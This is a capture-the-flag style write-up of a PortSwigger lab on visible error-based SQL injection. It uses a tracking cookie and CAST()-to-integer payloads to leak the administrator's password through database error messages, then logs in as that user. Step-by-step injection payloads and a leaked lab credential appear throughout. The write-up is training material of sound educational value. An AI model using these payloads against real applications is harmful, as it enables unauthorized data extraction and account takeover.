# Visible error-based SQL injection

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/sql-injection/blind/lab-sql-injection-visible-error-based), you'll learn: Visible error-based SQL injection! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★★★★★☆☆☆☆☆

## Background

This lab contains a [SQL injection](https://portswigger.net/web-security/sql-injection) vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie. The results of the SQL query are not returned.

The database contains a different table called `users`, with columns called `username` and `password`. To solve the lab, find a way to leak the password for the `administrator` user, then log in to their account.

## Exploitation

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-13/images/Pasted%20image%2020230519201247.png)

**When we go to `/`, it sets a new cookie called `TrackingId`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-13/images/Pasted%20image%2020230519201315.png)

Now, since tracking ID is very likely to be parsed to a SQL query, we can try to do SQL injection.

**To do so, I'll first try to output an error via an invalid SQL syntax query:**
```sql
wInK1AsJQtbzlaFg'
```

**When we modify that, it outputs a very verbose error:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-13/images/Pasted%20image%2020230519201602.png)

Misconfiguration of the database sometimes results in verbose error messages. These can provide information that may be useful to an attacker, like the above error:

```sql
SELECT * FROM tracking WHERE id = 'wInK1AsJQtbzlaFg''
```

This shows the full query that the application constructed using our input. As a result, we can see the context that we're injecting into, that is, a single-quoted string inside a `WHERE` statement. This makes it easier to construct a valid query containing a malicious payload. In this case, we can see that commenting out the rest of the query would prevent the superfluous single-quote from breaking the syntax:

```sql
wInK1AsJQtbzlaFg' OR 1=1-- -
```

**However, when we send the above payload:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-13/images/Pasted%20image%2020230519201906.png)

It doesn't have any error. More importantly, it doesn't return any data to us.

That being said, we're dealing with a blind-based SQL injection.

Let's leverage **conditional errors** to test a single boolean condition and trigger a database error if the condition is true.

According to [PortSwigger's SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet), we can try MySQL's conditional errors first:

```sql
SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')

SELECT IF(1=1,(SELECT table_name FROM information_schema.tables),'a')
SELECT IF(1=2,(SELECT table_name FROM information_schema.tables),'a')
```

**Payload:**
```sql
wInK1AsJQtbzlaFg' (SELECT IF(1=1,(SELECT table_name FROM information_schema.tables),'a'))-- -
wInK1AsJQtbzlaFg' (SELECT IF(1=2,(SELECT table_name FROM information_schema.tables),'a'))-- -
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-13/images/Pasted%20image%2020230519202633.png)

Wait a minute... **Why the verbose error message is truncated after `FROM inf`??**

Hmm... Maybe there's some character limits?

Luckly, **we can solve that truncated problem!**

Occasionally, you may be able to induce the application to generate an error message that contains some of the data that is returned by the query. This effectively turns an otherwise blind SQL injection vulnerability into a "visible" one.

One way of achieving this is to use the **`CAST()`** function, which enables you to convert one data type to another. For example, consider a query containing the following statement:

```sql
CAST((SELECT example_column FROM example_table) AS int)
```

Often, the data that you're trying to read is a string. Attempting to convert this to an incompatible data type, such as an `int`, may cause an error similar to the following:

```
ERROR: invalid input syntax for type integer: "Example data"
```

Let's do this!

**Since the lab's description says there's a table called `users`, with columns called `username` and `password`, we can try to select `username` column from `users` table.**

**But before we do that, I wanna try the `id` column in `tracking` table first, just to confirm it'll work:**
```sql
' OR CAST((SELECT id) AS int) = 1-- -
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-13/images/Pasted%20image%2020230519205645.png)

It worked!

**Let's try again but with table `users`, columns `username` and `password`:**
```sql
' OR CAST((SELECT username FROM users) AS int) = 1-- -
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-13/images/Pasted%20image%2020230519205912.png)

Uhh... "more than one row returned by a subquery used as an expression"?

**Don't worry, we can use the `LIMIT` clause to only show 1 record:**
```sql
' OR CAST((SELECT username FROM users LIMIT 1) AS int) = 1-- -
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-13/images/Pasted%20image%2020230519205959.png)

**Nice!! How about `administrator`'s password?**
```sql
' OR CAST((SELECT password FROM users LIMIT 1) AS int) = 1-- -
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-13/images/Pasted%20image%2020230519210027.png)

Let's go!!

- Administrator credentials: `administrator:113a9wnxvmaq9b3h2uf2`

**We can now login as `administrator` :D**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-13/images/Pasted%20image%2020230519210222.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-13/images/Pasted%20image%2020230519210230.png)

I'm `administrator`!

## What we've learned:

1. Blind SQL injection with conditional errors